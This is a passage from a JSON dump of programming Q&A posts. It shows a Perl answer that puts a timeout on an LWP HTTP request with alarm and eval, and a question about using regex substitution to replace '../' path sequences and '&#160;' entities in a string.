();\nmy $timeout = 30; # Timeout after 30 seconds.\nmy $ua      = LWP::UserAgent-&gt;new();\nmy $req     = HTTP::Request-&gt;new( GET =&gt; 'http://www.example.org/dummy.html' );\nmy $res     = undef;\neval {\n    # What happens once the timeout has occured:\n    local $SIG{ALRM} = sub { die \"Alarm fuer Zeitueberschreitung!\\n\" };\n    alarm $timeout; # set alarm to 30 seconds\n    $res = $ua-&gt;request( $req ); # make the problematic call\n    alarm 0;        # turn alarm off\n};\n# eval's $@ contains the signal word 'Zeitueberschreitung' (timeout):\nif( $@ &amp;&amp; $@ =~ m/Zeitueberschreitung/ ) {\n    print \"Zeitueberschreitungs-Regel wurde ausgeloesst!\\n\";\n}\n# request was successfull\nelsif ( $res &amp;&amp; $res-&gt;is_success() ) {  \n    print \"Alles ist OK.\\n\";\n}\n# something else went wrong\nelse {\n    print \"HTTP-Fehler: \" . $res-&gt;status_line() . \"\\n\";\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12291901,"title":"perl find and replace ../ and &#160;","body":"<p>I am using Perl to replace all instances of  </p>\n\n<p><code>../../../../../../abc'</code> and <code>&amp;#160;</code></p>\n\n<p>in a string with</p>\n\n<p><code>/</code> and <code>&amp;nbsp;</code>, respectively.</p>\n\n<p>The method I am using looks like this:</p>\n\n<pre><code>sub encode\n{\n    my $result = $_[0];\n    $result =~ s/..\\/..\\/..\\/..\\/..\\/..\\//\\//g;\n    $result =~ s/&amp;#160;/&amp;nbsp;/g;\n    return $result;\n}\n</code></pre>\n\n<p>Is this correct?</p>\n"}]}
